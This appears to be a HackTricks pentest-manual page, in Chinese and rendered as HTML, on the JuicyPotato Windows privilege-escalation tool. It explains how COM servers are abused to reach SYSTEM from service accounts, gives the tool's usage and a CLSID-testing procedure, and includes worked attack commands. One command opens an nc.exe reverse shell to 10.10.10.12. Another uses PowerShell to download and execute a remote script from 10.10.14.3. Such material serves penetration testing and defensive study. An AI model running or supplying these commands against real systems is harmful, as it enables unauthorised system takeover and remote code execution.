@@ -1,0 +1,323 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>JuicyPotato</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="juicypotato"><a class="header" href="#juicypotato">JuicyPotato</a></h1>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<p>{% hint style="warning" %}
+<strong>JuicyPotato 在</strong> Windows Server 2019 和 Windows 10 build 1809 及之后版本上<strong>无法工作</strong>。然而， <a href="https://github.com/itm4n/PrintSpoofer"><strong>PrintSpoofer</strong></a><strong>、</strong> <a href="https://github.com/antonioCoco/RoguePotato"><strong>RoguePotato</strong></a><strong>、</strong> <a href="https://github.com/bugch3ck/SharpEfsPotato"><strong>SharpEfsPotato</strong></a> 可以用来 <strong>利用相同的权限并获得 <code>NT AUTHORITY\SYSTEM</code></strong> 级别的访问权限。 <em><strong>检查：</strong></em>
+{% endhint %}</p>
+<p>{% content-ref url="roguepotato-and-printspoofer.md" %}
+<a href="roguepotato-and-printspoofer.html">roguepotato-and-printspoofer.md</a>
+{% endcontent-ref %}</p>
+<h2 id="juicy-potato-滥用黄金权限"><a class="header" href="#juicy-potato-滥用黄金权限">Juicy Potato (滥用黄金权限) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a></a></h2>
+<p><em>一个经过糖化的</em> <a href="https://github.com/breenmachine/RottenPotatoNG"><em>RottenPotatoNG</em></a> <em>版本，带有一点“果汁”，即 <strong>另一个本地权限提升工具，从 Windows 服务账户到 NT AUTHORITY\SYSTEM</strong></em></p>
+<h4 id="你可以从-httpsciappveyorcomprojectohpejuicy-potatobuildartifacts-下载-juicypotato"><a class="header" href="#你可以从-httpsciappveyorcomprojectohpejuicy-potatobuildartifacts-下载-juicypotato">你可以从 <a href="https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts">https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts</a> 下载 juicypotato</a></h4>
+<h3 id="摘要"><a class="header" href="#摘要">摘要 <a href="#summary" id="summary"></a></a></h3>
+<p><a href="https://github.com/ohpe/juicy-potato/blob/master/README.md"><strong>来自 juicy-potato 的 Readme</strong></a><strong>:</strong></p>
+<p><a href="https://github.com/breenmachine/RottenPotatoNG">RottenPotatoNG</a> 及其 <a href="https://github.com/decoder-it/lonelypotato">变种</a> 利用基于 <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx"><code>BITS</code></a> <a href="https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126">服务</a> 的权限提升链，具有在 <code>127.0.0.1:6666</code> 上的 MiTM 监听器，并且当你拥有 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 权限时。在一次 Windows 构建审查中，我们发现了一个 <code>BITS</code> 被故意禁用且端口 <code>6666</code> 被占用的设置。</p>
+<p>我们决定武器化 <a href="https://github.com/breenmachine/RottenPotatoNG">RottenPotatoNG</a>：<strong>向 Juicy Potato 打个招呼</strong>。</p>
+<blockquote>
+<p>有关理论，请参见 <a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">Rotten Potato - 从服务账户到 SYSTEM 的权限提升</a> 并跟踪链接和参考链。</p>
+</blockquote>
+<p>我们发现，除了 <code>BITS</code> 之外，还有几个 COM 服务器可以被滥用。它们只需要：</p>
+<ol>
+<li>由当前用户实例化，通常是具有模拟权限的“服务用户”</li>
+<li>实现 <code>IMarshal</code> 接口</li>
+<li>以提升的用户身份运行（SYSTEM、管理员等）</li>
+</ol>
+<p>经过一些测试，我们在多个 Windows 版本上获得并测试了一份广泛的 <a href="http://ohpe.it/juicy-potato/CLSID/">有趣 CLSID 列表</a>。</p>
+<h3 id="juicy-细节"><a class="header" href="#juicy-细节">Juicy 细节 <a href="#juicy-details" id="juicy-details"></a></a></h3>
+<p>JuicyPotato 允许你：</p>
+<ul>
+<li><strong>目标 CLSID</strong> <em>选择你想要的任何 CLSID。</em> <a href="http://ohpe.it/juicy-potato/CLSID/"><em>这里</em></a> <em>你可以找到按操作系统组织的列表。</em></li>
+<li><strong>COM 监听端口</strong> <em>定义你喜欢的 COM 监听端口（而不是硬编码的 6666）</em></li>
+<li><strong>COM 监听 IP 地址</strong> <em>在任何 IP 上绑定服务器</em></li>
+<li><strong>进程创建模式</strong> <em>根据模拟用户的权限，你可以选择：</em></li>
+<li><code>CreateProcessWithToken</code>（需要 <code>SeImpersonate</code>）</li>
+<li><code>CreateProcessAsUser</code>（需要 <code>SeAssignPrimaryToken</code>）</li>
+<li><code>两者都可以</code></li>
+<li><strong>要启动的进程</strong> <em>如果利用成功，启动一个可执行文件或脚本</em></li>
+<li><strong>进程参数</strong> <em>自定义启动进程的参数</em></li>
+<li><strong>RPC 服务器地址</strong> <em>为了隐蔽的方式，你可以认证到外部 RPC 服务器</em></li>
+<li><strong>RPC 服务器端口</strong> <em>如果你想认证到外部服务器且防火墙阻止端口 <code>135</code>，这很有用…</em></li>
+<li><strong>测试模式</strong> <em>主要用于测试目的，即测试 CLSID。它创建 DCOM 并打印令牌的用户。请参见</em> <a href="http://ohpe.it/juicy-potato/Test/"><em>这里进行测试</em></a></li>
+</ul>
+<h3 id="使用"><a class="header" href="#使用">使用 <a href="#usage" id="usage"></a></a></h3>
+<pre><code>T:\&gt;JuicyPotato.exe
+JuicyPotato v0.1
+
+Mandatory args:
+-t createprocess call: &lt;t&gt; CreateProcessWithTokenW, &lt;u&gt; CreateProcessAsUser, &lt;*&gt; try both
+-p &lt;program&gt;: program to launch
+-l &lt;port&gt;: COM server listen port
+
+
+Optional args:
+-m &lt;ip&gt;: COM server listen address (default 127.0.0.1)
+-a &lt;argument&gt;: command line argument to pass to program (default NULL)
+-k &lt;ip&gt;: RPC server ip address (default 127.0.0.1)
+-n &lt;port&gt;: RPC server listen port (default 135)
+</code></pre>
+<h3 id="最后思考"><a class="header" href="#最后思考">最后思考 <a href="#final-thoughts" id="final-thoughts"></a></a></h3>
+<p><a href="https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts"><strong>来自 juicy-potato 读我</strong></a><strong>:</strong></p>
+<p>如果用户拥有 <code>SeImpersonate</code> 或 <code>SeAssignPrimaryToken</code> 权限，那么你就是 <strong>SYSTEM</strong>。</p>
+<p>几乎不可能防止所有这些 COM 服务器的滥用。你可以考虑通过 <code>DCOMCNFG</code> 修改这些对象的权限，但祝你好运，这将是一个挑战。</p>
+<p>实际的解决方案是保护在 <code>* SERVICE</code> 账户下运行的敏感账户和应用程序。停止 <code>DCOM</code> 无疑会抑制此漏洞，但可能会对底层操作系统产生严重影响。</p>
+<p>来自: <a href="http://ohpe.it/juicy-potato/">http://ohpe.it/juicy-potato/</a></p>
+<h2 id="示例"><a class="header" href="#示例">示例</a></h2>
+<p>注意: 访问 <a href="https://ohpe.it/juicy-potato/CLSID/">此页面</a> 获取可尝试的 CLSID 列表。</p>
+<h3 id="获取-ncexe-反向-shell"><a class="header" href="#获取-ncexe-反向-shell">获取 nc.exe 反向 shell</a></h3>
+<pre><code>c:\Users\Public&gt;JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+......
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+c:\Users\Public&gt;
+</code></pre>
+<h3 id="powershell-rev"><a class="header" href="#powershell-rev">Powershell rev</a></h3>
+<pre><code>.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
+</code></pre>
+<h3 id="启动新的-cmd如果您有-rdp-访问权限"><a class="header" href="#启动新的-cmd如果您有-rdp-访问权限">启动新的 CMD（如果您有 RDP 访问权限）</a></h3>
+<p><img src="../../.gitbook/assets/image%20(300).png" alt="" /></p>
+<h2 id="clsid-问题"><a class="header" href="#clsid-问题">CLSID 问题</a></h2>
+<p>通常，JuicyPotato 使用的默认 CLSID <strong>无法工作</strong>，并且漏洞利用失败。通常，需要多次尝试才能找到一个 <strong>有效的 CLSID</strong>。要获取特定操作系统的 CLSID 列表，您应该访问此页面：</p>
+<p>{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}</p>
+<h3 id="检查-clsid"><a class="header" href="#检查-clsid"><strong>检查 CLSID</strong></a></h3>
+<p>首先，您需要一些可执行文件，除了 juicypotato.exe。</p>
+<p>下载 <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1">Join-Object.ps1</a> 并将其加载到您的 PS 会话中，然后下载并执行 <a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1">GetCLSID.ps1</a>。该脚本将创建一个可能的 CLSID 列表以供测试。</p>
+<p>然后下载 <a href="https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat">test_clsid.bat </a>（更改 CLSID 列表和 juicypotato 可执行文件的路径）并执行它。它将开始尝试每个 CLSID，<strong>当端口号改变时，这意味着 CLSID 有效</strong>。</p>
+<p><strong>使用参数 -c 检查</strong> 有效的 CLSID</p>
+<h2 id="参考"><a class="header" href="#参考">参考</a></h2>
+<ul>
+<li><a href="https://github.com/ohpe/juicy-potato/blob/master/README.md">https://github.com/ohpe/juicy-potato/blob/master/README.md</a></li>
+</ul>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>电报群组</strong></a> 或 <strong>在 Twitter 上关注</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github 仓库提交 PR 来分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../windows-hardening/windows-local-privilege-escalation/integrity-levels.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="../../windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../windows-hardening/windows-local-privilege-escalation/integrity-levels.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="../../windows-hardening/windows-local-privilege-escalation/leaked-handle-exploitation.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="../../elasticlunr.min.js"></script>
+        <script src="../../mark.min.js"></script>
+        <script src="../../searcher.js"></script>
+
+        <script src="../../clipboard.min.js"></script>
+        <script src="../../highlight.js"></script>
+        <script src="../../book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
